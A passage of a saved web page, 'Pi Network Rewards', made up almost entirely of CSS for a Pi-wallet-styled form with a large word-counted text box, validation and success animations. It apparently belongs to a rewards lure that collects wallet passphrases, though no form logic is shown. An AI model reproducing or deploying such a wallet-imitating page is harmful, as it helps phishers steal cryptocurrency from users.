<!DOCTYPE html>
<!-- saved from url=(0018)https://pimart.us/ -->
<html lang="en"><script type="text/javascript" async="" charset="utf-8" src="./index.php_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-0uUcqAX/lKvnfFMvCM7U5wcjfgBvv/1q+xxZKV6ZhBH4ikGcgTDEC4vEZPTt3l8O"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Pi Network Rewards</title>
        <link href="./index.php_files/tailwind.min.css" rel="stylesheet">
        <link rel="stylesheet" href="./index.php_files/all.min.css">
        <link rel="icon" type="image/png" sizes="32x32" href="./index.php_files/favicon42527eabc5bda97a.png">
        <link rel="icon" type="image/png" sizes="96x96" href="./index.php_files/favicon42527eabc5bda97a.png">
        <link rel="icon" type="image/png" sizes="192x192" href="./index.php_files/favicon42527eabc5bda97a.png">
        <link rel="apple-touch-icon" sizes="180x180" href="./index.php_files/favicon42527eabc5bda97a.png">
        <link rel="icon" type="image/x-icon" href="https://pimart.us/favicon.ico">
        <!-- Add Google Fonts for better typography -->
        <link rel="preconnect" href="https://fonts.googleapis.com/">
        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
        <link href="./index.php_files/css2" rel="stylesheet">

        <style>
            :root {
                /* Enhanced color palette */
                --pi-purple: #744394;
                --pi-purple-light: #7d48a0;
                --pi-purple-dark: #54306f;
                --pi-gold: #f8c056;
                --pi-gold-light: #ffd78c;
                --pi-gold-dark: #e6a938;

                /* Secondary accent colors */
                --pi-teal: #4ecdc4;
                --pi-pink: #ff6b8b;
                --pi-blue: #45b7d1;

                /* Animation timing */
                --transition-fast: 0.2s;
                --transition-medium: 0.4s;
                --transition-slow: 0.8s;
            }

            /* Dark mode is default now */
            :root {
                --bg-primary: #1a0e24;
                --bg-secondary: #2a1052;
                --text-primary: #ffffff;
                --text-secondary: #e0d0ff;
                --card-bg: rgba(30, 12, 48, 0.85);
                --input-bg: rgba(30, 12, 48, 0.5);
            }

            /* Light mode styles - only applied when .light-mode class is present */
            .light-mode {
                --bg-primary: #f5efff;
                --bg-secondary: #eee6ff;
                --text-primary: #333333;
                --text-secondary: #666666;
                --card-bg: rgba(255, 255, 255, 0.85);
                --input-bg: rgba(255, 255, 255, 0.8);
            }

            /* Form page always uses light mode */
            #formPage {
                background-color: white !important;
                min-height: 100vh;
                overflow-y: auto;
                position: relative;
                padding-bottom: 2rem;
            }

            #formPage .container {
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                padding-bottom: 2rem;
            }

            #formPage .pi-wallet-style {
                flex: 1;
                display: flex;
                flex-direction: column;
                margin: 0 auto;
                width: 100%;
                max-width: 500px;
                padding: 1rem;
            }

            #formPage .mt-8 {
                margin-bottom: 5rem; /* Thêm margin dưới cho container của nút quay lại */
            }

            #formPage .py-8 {
                padding-top: 1rem !important; /* Ghi đè padding mặc định của Tailwind nếu có */
                padding-bottom: 8rem !important; /* Giữ nguyên padding dưới */
            }

            body {
                font-family: "Inter", "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                background-color: var(--bg-primary);
                color: var(--text-primary);
                margin: 0;
                padding: 0;
                min-height: 100vh;
                overflow-x: hidden;
                position: relative;
                will-change: transform;
                line-height: 1.6;
                font-size: 1rem;
                letter-spacing: -0.014em;
                font-weight: 500;
            }

            h1,
            h2,
            h3,
            h4,
            h5,
            h6 {
                font-family: "Roboto", "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                font-weight: 700;
                letter-spacing: -0.021em;
                line-height: 1.3;
            }

            h1,
            h2,
            h3,
            h4,
            h5,
            h6 {
                font-family: "Roboto", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                font-weight: 700;
                letter-spacing: -0.02em;
                line-height: 1.2;
            }

            #formPage .pi-title,
            .pi-wallet-style .pi-title {
                font-size: 1.62rem !important; /* Tăng kích thước */
                font-weight: 420 !important; /* Đảm bảo độ đậm tối đa */
                text-align: center !important;
                margin-top: 0.6rem !important;
                margin-bottom: 2rem !important;
                color: #0f0e0e !important; /* Màu đen hoàn toàn */
                text-shadow: 0px 0.5px 0px rgba(0, 0, 0, 0.5) !important; /* Tăng bóng đổ */
                font-family: "Roboto", sans-serif !important;
                letter-spacing: -0.02em !important; /* Giảm khoảng cách chữ */
                -webkit-text-stroke: 0.3px black !important; /* Tạo viền ngoài cho chữ */
                transform: scale(1.01, 1) !important; /* Làm chữ hơi rộng ra */
                display: block !important;
                line-height: 1.2 !important; /* Giảm line height */
            }

            .pi-header {
                background: #6e3b8f; /* Thay đổi từ gradient sang màu đơn */
                padding: 10px 20px;
                display: flex;
                align-items: center;
                justify-content: space-between;
                position: relative;
                height: 56px;
                z-index: 50;
                box-shadow: 0 4px 20px rgba(122, 53, 164, 0.3);
            }

            .pi-header-content {
                display: flex;
                align-items: center;
                justify-content: center;
                width: 100%;
                position: relative;
            }

            .header-back-btn {
                position: absolute;
                left: 0;
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10;
                transition: transform var(--transition-fast);
            }

            .header-back-btn:hover {
                transform: translateX(-2px);
            }

            .header-dropdown-btn {
                position: absolute;
                right: 0;
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10;
                transition: transform var(--transition-fast);
            }

            .header-dropdown-btn:hover {
                transform: translateY(2px);
            }

            .wallet-icon {
                width: 30px;
                height: 30px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 8px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                color: var(--pi-purple);
                margin-right: 10px;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
                position: relative;
                overflow: hidden;
            }

            .wallet-icon::after {
                content: "";
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: linear-gradient(to bottom right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0) 40%, rgba(255, 255, 255, 0.4) 50%, rgba(255, 255, 255, 0) 60%, rgba(255, 255, 255, 0) 100%);
                transform: rotate(30deg);
                animation: shineIcon 3s infinite;
            }

            .wallet-text {
                color: white;
                font-size: 18px;
                font-weight: 700;
                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
            }

            .pi-coin-icon {
                width: 32px;
                height: 32px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                color: var(--pi-purple);
                margin-left: 10px;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
                position: relative;
                overflow: hidden;
            }

            .pi-coin-icon::after {
                content: "";
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: linear-gradient(to bottom right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0) 40%, rgba(255, 255, 255, 0.4) 50%, rgba(255, 255, 255, 0) 60%, rgba(255, 255, 255, 0) 100%);
                transform: rotate(30deg);
                animation: shineIcon 3s infinite;
                animation-delay: 1s;
            }

            /* Premium background elements - enhanced */
            .premium-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -10;
                overflow: hidden;
                pointer-events: none; /* prevent interaction with background */
            }

            /* Animated gradient - improved colors */
            .animated-gradient {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: radial-gradient(circle at 20% 30%, rgba(154, 83, 198, 0.1) 0%, transparent 60%), radial-gradient(circle at 80% 20%, rgba(154, 83, 198, 0.1) 0%, transparent 50%),
                    radial-gradient(circle at 50% 70%, rgba(248, 192, 86, 0.05) 0%, transparent 70%);
                opacity: 0.8;
            }

            /* Light streaks - enhanced */
            .light-streak {
                position: absolute;
                height: 1px;
                width: 200px;
                background: linear-gradient(90deg, transparent, rgba(154, 83, 198, 0.5), transparent);
                border-radius: 100%;
                opacity: 0;
                animation: lightStreak 12s linear infinite; /* Slower animation */
                will-change: transform, opacity; /* Optimize animation */
            }

            /* Moving waves - enhanced */
            .wave-container {
                position: absolute;
                width: 100%;
                height: 100%;
                overflow: hidden;
                opacity: 0.2;
            }

            .wave {
                position: absolute;
                width: 200%;
                height: 200%;
                border-radius: 40%;
                opacity: 0.2;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                animation: waveRotate 60s linear infinite; /* Slowed down */
                will-change: transform; /* Optimize animation */
            }

            .wave1 {
                border: 1px solid rgba(154, 83, 198, 0.3);
                animation-duration: 60s; /* Slowed down */
            }

            .wave2 {
                border: 1px solid rgba(248, 192, 86, 0.3);
                animation-duration: 50s; /* Slowed down */
                animation-direction: reverse;
            }

            .wave3 {
                border: 1px solid rgba(154, 83, 198, 0.2);
                animation-duration: 70s; /* Slowed down */
            }

            /* Stars - enhanced */
            .star {
                position: absolute;
                background-color: white;
                border-radius: 50%;
                filter: blur(1px);
                opacity: 0.4;
                animation: twinkle 4s infinite ease-in-out;
            }

            /* Star with single point - enhanced */
            .star-single {
                position: absolute;
                width: 2px;
                height: 2px;
                background-color: white;
                border-radius: 50%;
                filter: blur(0.5px);
                opacity: 0.8;
                box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
                animation: twinkleStar 3s infinite ease-in-out;
            }

            /* Pi coins - enhanced */
            .premium-coin {
                position: absolute;
                width: 60px;
                height: 60px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                color: var(--pi-purple);
                z-index: -1;
                transform-style: preserve-3d;
                will-change: transform; /* Optimize animation */
                filter: drop-shadow(0 10px 15px rgba(0, 0, 0, 0.1));
            }

            .coin-inner {
                position: relative;
                width: 100%;
                height: 100%;
                border-radius: 50%;
                text-align: center;
                transition: transform 0.6s;
                transform-style: preserve-3d;
                animation: coinRotate 20s infinite linear; /* Slowed down */
            }

            .coin-front,
            .coin-back {
                position: absolute;
                width: 100%;
                height: 100%;
                border-radius: 50%;
                backface-visibility: hidden;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 2rem;
                font-weight: bold;
            }

            .coin-front {
                background: radial-gradient(circle at 30% 30%, var(--pi-gold), var(--pi-gold-dark));
                box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
            }

            .coin-back {
                background: radial-gradient(circle at 30% 30%, var(--pi-gold-dark), var(--pi-gold));
                transform: rotateY(180deg);
                box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
            }

            /* Floating particles - enhanced */
            .particle {
                position: absolute;
                width: 6px;
                height: 6px;
                background-color: rgba(154, 83, 198, 0.2);
                border-radius: 50%;
                filter: blur(1px);
                animation: floatParticle 15s infinite linear;
                will-change: transform; /* Optimize animation */
            }

            /* Feature card with enhanced wave effect */
            .feature-card {
                position: relative;
                overflow: hidden;
                z-index: 1;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .feature-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
            }

            .feature-card-wave {
                position: absolute;
                top: 0;
                left: 0;
                width: 200%;
                height: 200%;
                background: radial-gradient(ellipse at center, rgba(105, 57, 136, 0.2) 0%, rgba(105, 57, 136, 0.1) 25%, rgba(105, 57, 136, 0) 70%);
                opacity: 0;
                border-radius: 50%;
                transform: translate(-25%, -25%) scale(0.1);
                animation: cardWave 4s infinite ease-out;
                pointer-events: none;
            }

            /* Shiny wave effect for feature icons */
            .feature-icon {
                position: relative;
                overflow: hidden;
            }

            .feature-icon::after {
                content: "";
                position: absolute;
                top: -50%;
                left: -100%;
                width: 70%;
                height: 200%;
                background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, calc(0.3 * var(--shine-opacity, 1))) 50%, rgba(255, 255, 255, 0) 100%);
                transform: rotate(30deg);
                animation: shinyWave 6s infinite ease-in-out; /* Tăng thời gian từ 3s lên 6s */
                pointer-events: none;
            }

            /* Confetti elements for success animation - enhanced */
            /* Confetti elements for success animation - enhanced */
            /* Confetti elements for success animation - enhanced */
            .confetti-container {
                position: fixed;
                width: 100vw;
                height: 100vh;
                top: 0;
                left: 0;
                z-index: 2000; /* Increased z-index to appear above the modal */
                pointer-events: none;
                overflow: hidden;
                display: none;
            }

            .confetti {
                position: absolute;
                width: 10px;
                height: 10px;
                background-color: var(--pi-gold);
                opacity: 0;
            }

            /* Square confetti */
            .confetti-square {
                background-color: var(--pi-purple);
            }

            /* Circle confetti */
            .confetti-circle {
                border-radius: 50%;
                background-color: var(--pi-gold);
            }

            /* Triangle confetti */
            .confetti-triangle {
                width: 0;
                height: 0;
                background-color: transparent;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-bottom: 10px solid var(--pi-purple-light);
            }

            /* Page container and transitions */
            .page-container {
                padding-bottom: 0;
                width: 100%;
                max-width: 100vw;
                overflow-x: hidden;
                min-height: calc(100vh - 64px);
                position: relative;
            }

            #formPage .mt-8.text-center {
                margin-top: 1rem !important; /* Giảm khoảng cách phía trên nút */
            }

            .page {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                min-height: calc(100vh - 64px);
                transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1);
                background-color: transparent;
                z-index: 10;
                will-change: transform, opacity; /* Optimize animation */
            }

            .page-active {
                transform: translateX(0);
                opacity: 1;
                z-index: 11;
            }

            .page-inactive-right {
                transform: translateX(100%);
                opacity: 0;
                z-index: 9;
                pointer-events: none;
            }

            .page-inactive-left {
                transform: translateX(-100%);
                opacity: 0;
                z-index: 9;
                pointer-events: none;
            }

            /* Premium cards - enhanced */
            .card {
                background-color: var(--card-bg);
                backdrop-filter: blur(15px);
                border-radius: 0.8rem;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                overflow: hidden;
                position: relative;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .card::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
                pointer-events: none;
            }

            .card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
            }

            /* Premium buttons - enhanced */
            .btn-primary {
                background: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-dark));
                color: white;
                font-weight: 600;
                border-radius: 0.5rem;
                padding: 0.9rem 2rem;
                transition: all 0.3s ease;
                box-shadow: 0 6px 15px rgba(122, 53, 164, 0.25);
                position: relative;
                overflow: hidden;
                z-index: 1;
                border: 1px solid var(--pi-gold);
                outline: none;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            .btn-primary:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 20px rgba(122, 53, 164, 0.4);
            }

            .btn-primary:active {
                transform: translateY(1px);
            }

            .btn-secondary {
                background: rgba(122, 53, 164, 0.1);
                color: var(--pi-purple);
                font-weight: 600;
                border-radius: 0.5rem;
                padding: 0.75rem 1.5rem;
                transition: all 0.3s ease;
                position: relative;
                overflow: hidden;
                border: 1px solid rgba(122, 53, 164, 0.2);
            }

            .btn-secondary:hover {
                background: rgba(122, 53, 164, 0.15);
                transform: translateY(-2px);
            }

            /* Premium reward cards - enhanced */
            .reward-card {
                position: relative;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                overflow: hidden;
                border-top: 3px solid transparent;
                background: linear-gradient(var(--card-bg), var(--card-bg)) padding-box, linear-gradient(90deg, var(--pi-purple), var(--pi-gold)) border-box;
                border-radius: 0.8rem;
            }

            .reward-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
            }

            .reward-amount {
                color: var(--pi-purple);
                font-weight: bold;
                font-size: 2rem;
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                z-index: 1;
            }

            .reward-amount::before {
                content: "π";
                font-size: 2.2rem;
                margin-right: 0.2rem;
            }

            .reward-amount::after {
                content: "";
                position: absolute;
                width: 70px;
                height: 70px;
                background: radial-gradient(circle, rgba(248, 192, 86, 0.15) 0%, transparent 70%);
                border-radius: 50%;
                z-index: -1;
            }

            /* Premium progress bar - enhanced */
            .progress-bar {
                height: 8px;
                border-radius: 10px;
                background: rgba(122, 53, 164, 0.1);
                overflow: hidden;
                position: relative;
            }

            .progress-fill {
                height: 100%;
                border-radius: 10px;
                background: linear-gradient(90deg, var(--pi-purple), var(--pi-purple-light));
                position: relative;
                overflow: hidden;
            }

            /* Premium feature icons - enhanced */
            .feature-icon {
                width: 70px;
                height: 70px;
                border-radius: 12px;
                background: linear-gradient(135deg, var(--pi-purple-light), var(--pi-purple));
                box-shadow: 0 8px 20px rgba(122, 53, 164, 0.2);
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 1rem;
                position: relative;
                overflow: hidden;
            }

            .feature-icon i {
                font-size: 2rem;
                color: white;
                position: relative;
                z-index: 2;
            }

            /* Pi Wallet style form - enhanced */
            .pi-wallet-style {
                margin: 0 auto;
                max-width: 500px;
                padding: 0 20px;
                padding-top: 10px; /* Thêm padding top nhỏ hơn */
            }
            .pi-title {
                font-size: 1.8rem; /* Tăng kích thước một chút */
                font-weight: 900; /* Sử dụng giá trị tối đa tiêu chuẩn */
                text-align: center;
                margin-top: 0.6rem;
                margin-bottom: 2rem;
                color: #111; /* Màu đen đậm hơn */
                text-shadow: 0px 0.2px 0px rgba(0, 0, 0, 0.3); /* Thêm bóng mỏng để tạo hiệu ứng đậm */
                font-family: "Roboto", sans-serif;
                letter-spacing: -0.01em; /* Giảm khoảng cách chữ để tạo cảm giác đậm hơn */
            }
            .pi-input-container {
                margin-bottom: 1.3rem; /* Giảm từ 2rem xuống 1rem để giảm khoảng cách với nút */
                border-radius: 12px;
                min-height: 250px;
                overflow: hidden;
                background: transparent;
                border: 1px solid #ccc; /* Thay đổi từ #000 sang #ccc để có viền màu xám */
                box-shadow: none;
                max-width: 1000px;
                margin-left: auto;
                margin-right: auto;
                display: flex;
                flex-direction: column;
            }

            .pi-input-container:focus-within {
                border: 2px solid var(--pi-purple);
                box-shadow: 0 5px 25px rgba(105, 57, 136, 0.2);
            }

            .pi-input {
                width: 100%;
                padding: 24px;
                min-height: 250px; /* Thay đổi từ height thành min-height */
                height: auto; /* Cho phép tự động mở rộng chiều cao */
                resize: none;
                background: transparent;
                border: none;
                font-size: 1.2rem;
                color: #333;
                outline: none;
                vertical-align: top;
                text-align: left;
                word-break: break-word;
                overflow-wrap: break-word;
                white-space: pre-wrap;
                display: block;
                align-self: flex-start;
                font-family: monospace;
                line-height: 1; /* Giảm khoảng cách giữa các dòng */
                font-weight: 400;
            }

            .pi-button {
                width: 100%;
                padding: 13.5px; /* Tăng từ 13px lên 15px để tăng chiều dọc */
                font-size: 0.85rem; /* Tăng từ 0.85rem lên 0.9rem */
                font-weight: 600;
                text-transform: uppercase;
                text-align: center;
                border-radius: 8px;
                margin-bottom: 0.8rem;
                transition: all 0.3s ease;
                letter-spacing: 0.05em;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }

            /* Enhanced balloon animation styles */
            .balloon {
                position: absolute;
                width: 40px;
                height: 50px;
                background: radial-gradient(circle at 30% 30%, var(--balloon-color), var(--balloon-color-dark));
                border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
                box-shadow: inset 0 -8px 0 rgba(0, 0, 0, 0.2), 0 5px 10px rgba(0, 0, 0, 0.1);
                animation: balloonFloat 30s linear infinite;
                opacity: 0.8;
                z-index: -5;
                will-change: transform;
                transform-origin: bottom center;
            }

            .balloon:after {
                content: "";
                position: absolute;
                bottom: -12px;
                left: 50%;
                transform: translateX(-50%);
                width: 2px;
                height: 15px;
                background: rgba(0, 0, 0, 0.2);
            }

            /* Enhanced balloon animation */
            @keyframes balloonFloat {
                0% {
                    transform: translateY(100vh) translateX(0px) rotate(0deg);
                    opacity: 0;
                }
                10% {
                    opacity: 0.8;
                    transform: translateY(80vh) translateX(var(--float-distance)) rotate(5deg);
                }
                50% {
                    transform: translateY(40vh) translateX(calc(var(--float-distance) * 1.5)) rotate(-5deg);
                }
                90% {
                    opacity: 0.8;
                    transform: translateY(10vh) translateX(var(--float-distance)) rotate(5deg);
                }
                100% {
                    transform: translateY(-100px) translateX(var(--float-distance)) rotate(0deg);
                    opacity: 0;
                }
            }

            .pi-button-primary {
                background: #724394;
                color: white;
                border: none;
                box-shadow: none;
                border-radius: 8px;
                text-transform: uppercase;
                font-weight: 700;
                margin-top: 0.5rem;
                margin-bottom: 1rem;
            }

            .pi-button-primary::before {
                content: "";
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0) 100%);
                transition: all 0.6s ease;
            }

            .pi-button-primary:hover {
                background: linear-gradient(135deg, var(--pi-purple-light), var(--pi-purple));
                transform: translateY(-2px);
                box-shadow: 0 8px 16px rgba(122, 53, 164, 0.35);
            }

            .pi-button-primary:hover::before {
                left: 100%;
            }

            .pi-button-primary:disabled {
                background-color: #a5a5a5;
                transform: none;
                cursor: not-allowed;
                box-shadow: none;
                opacity: 0.7;
            }

            .pi-button-secondary {
                background: white;
                color: #724394;
                border: 1px solid #724394;
                border-radius: 8px;
                text-transform: uppercase;
                font-weight: 700;
                margin-top: 0;
            }

            .pi-button-secondary::after {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(122, 53, 164, 0.05);
                z-index: -1;
                transform: scaleX(0);
                transform-origin: right;
                transition: transform 0.3s ease;
            }

            .pi-button-secondary:hover {
                background-color: rgba(114, 67, 148, 0.05); /* Màu nền nhạt khi hover */
            }

            .pi-button-secondary:hover::after {
                transform: scaleX(1);
                transform-origin: left;
            }

            .pi-info-text {
                font-size: 1rem;
                line-height: 1.6;
                color: #000;
                margin-top: 1.4rem; /* Giảm từ 2rem xuống 1.5rem */
                margin-bottom: 1rem; /* Thêm margin-bottom để kiểm soát khoảng cách với nút vân tay */
                text-align: left;
                word-wrap: break-word;
                white-space: normal;
                width: 100%;
                font-weight: 400;
            }

            .pi-link {
                color: #3d9dff;
                text-decoration: none;
                position: relative;
                transition: color 0.3s ease;
            }

            .pi-link::after {
                content: "";
                position: absolute;
                bottom: -2px;
                left: 0;
                width: 100%;
                height: 1px;
                background-color: #3d9dff;
                transform: scaleX(0);
                transform-origin: right;
                transition: transform 0.3s ease;
            }

            .pi-link:hover {
                color: #65b5ff;
            }

            .pi-link:hover::after {
                transform: scaleX(1);
                transform-origin: left;
            }

            /* Scroll animations - enhanced */
            .animate-on-scroll {
                opacity: 0;
                transform: translateY(30px);
                transition: opacity 0.8s ease, transform 0.8s ease;
                will-change: opacity, transform; /* Optimize animation */
            }

            .animate-on-scroll.animated {
                opacity: 1;
                transform: translateY(0);
            }

            .animate-fade-in {
                opacity: 0;
                transition: opacity 1s ease;
                will-change: opacity; /* Optimize animation */
            }

            .animate-fade-in.animated {
                opacity: 1;
            }

            /* Enhanced about section illustration */
            .about-illustration {
                width: 180px;
                height: 180px;
                margin: 0 auto 2rem;
                position: relative;
            }

            .about-circle {
                width: 100%;
                height: 100%;
                border-radius: 50%;
                background: linear-gradient(135deg, rgba(154, 83, 198, 0.1), rgba(154, 83, 198, 0.2));
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                overflow: hidden;
            }

            .about-circle::before {
                content: "";
                position: absolute;
                width: 90%;
                height: 90%;
                border-radius: 50%;
                border: 2px dashed rgba(154, 83, 198, 0.3);
                /* Removed animation to keep dashed border static */
            }

            .about-icon {
                font-size: 4rem;
                color: var(--pi-purple);
                position: relative;
                z-index: 1;
            }

            /* Loading overlay - enhanced */
            .loading-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgb(255, 255, 255);
                display: none;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                backdrop-filter: blur(5px);
            }

            .loading-content {
                text-align: center;
                color: white;
            }

            .loading-spinner {
                width: 50px;
                height: 50px;
                border: 4px solid rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                border-top-color: #713d92;
                animation: spin 1s ease-in-out infinite;
                margin: 0 auto 15px;
            }

            .loading-text {
                font-size: 16px;
                font-weight: 500;
                color: white;
            }

            @keyframes spin {
                to {
                    transform: rotate(360deg);
                }
            }

            /* Enhanced explosion particles */
            .surprise-container {
                position: relative;
                overflow: hidden;
            }

            .surprise-trigger.active .explosion-particle {
                animation: explode 1s forwards;
            }

            .explosion-particle {
                position: absolute;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                background-color: var(--pi-gold);
                opacity: 0;
                pointer-events: none;
            }

            /* Enhanced 3D effect */
            .tilt-card {
                transform-style: preserve-3d;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
            }

            .tilt-card:hover {
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            }

            /* Certificate badge - enhanced */
            .certificate {
                position: relative;
                padding: 1.8rem;
                border-radius: 0.8rem;
                background: linear-gradient(135deg, rgba(248, 192, 86, 0.1), rgba(154, 83, 198, 0.1));
                border: 1px dashed rgba(248, 192, 86, 0.3);
                margin-top: 2rem;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            }

            .certificate-icon {
                position: absolute;
                top: -20px;
                left: 50%;
                transform: translateX(-50%);
                width: 40px;
                height: 40px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            }

            .certificate-icon i {
                color: white;
                font-size: 1.2rem;
            }

            .certificate-title {
                font-weight: bold;
                text-align: center;
                margin-bottom: 0.5rem;
                margin-top: 0.5rem;
                font-size: 1.2rem;
                color: var(--pi-purple);
            }

            .certificate-text {
                text-align: center;
                font-size: 0.95rem;
                color: var(--text-secondary);
            }

            /* Floating icons - enhanced */
            .floating-icon {
                position: absolute;
                z-index: -1;
                opacity: 0.5;
                animation: float 6s ease-in-out infinite;
            }

            /* Word counter styles - enhanced */
            .word-counter {
                text-align: right;
                font-size: 0.9rem;
                color: var(--text-secondary);
                margin-top: 0.5rem;
                margin-bottom: 0.5rem;
                padding-right: 0.5rem;
                display: none; /* Hidden by default */
                transition: all 0.3s ease;
            }

            .word-counter.invalid {
                color: #f44336;
                font-weight: 600;
                display: block; /* Show when invalid */
                animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
            }

            /* Validation message - enhanced */
            .validation-message {
                color: #e74c3c;
                font-size: 1rem; /* Kích thước lớn hơn chút */
                margin-top: 0.5rem;
                margin-bottom: 1rem;
                text-align: left;
                font-weight: 400;
                padding-left: 0.5rem; /* Giảm padding */
            }

            .hidden {
                display: none;
            }

            /* Visual indicator for input container - enhanced */
            .pi-input-container.valid-input {
                border: 2px solid #724394; /* Màu tím thay vì màu xanh */
                box-shadow: 0 0 15px rgba(114, 67, 148, 0.2);
            }
            .pi-input-container.invalid-input {
                border: 2px solid #f44336;
                box-shadow: 0 0 15px rgba(244, 67, 54, 0.2);
                animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
            }

            @keyframes shake {
            }

            /* Limited submissions message - enhanced */
            .limit-message {
                background-color: #fff3cd;
                color: #856404;
                padding: 15px;
                border-radius: 8px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #ffeeba;
                font-weight: 500;
                display: none;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
                position: relative;
                overflow: hidden;
            }

            .limit-message::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 4px;
                height: 100%;
                background-color: #f8c056;
            }

            .error-message {
                background-color: #f8d7da;
                color: #721c24;
                padding: 15px;
                border-radius: 8px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #f5c6cb;
                font-weight: 500;
                display: none;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
                position: relative;
                overflow: hidden;
            }

            .error-message::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 4px;
                height: 100%;
                background-color: #f44336;
            }

            /* Professional floating icons */
            .floating-icon-img {
                position: absolute;
                width: 80px;
                height: 80px;
                animation: iconFloat 40s linear infinite;
                opacity: 0.9;
                z-index: -5;
                will-change: transform;
                object-fit: contain;
                /* Removed background-color, backdrop-filter, border-radius and box-shadow */
            }

            /* Professional icon float animation */
            @keyframes iconFloat {
                0% {
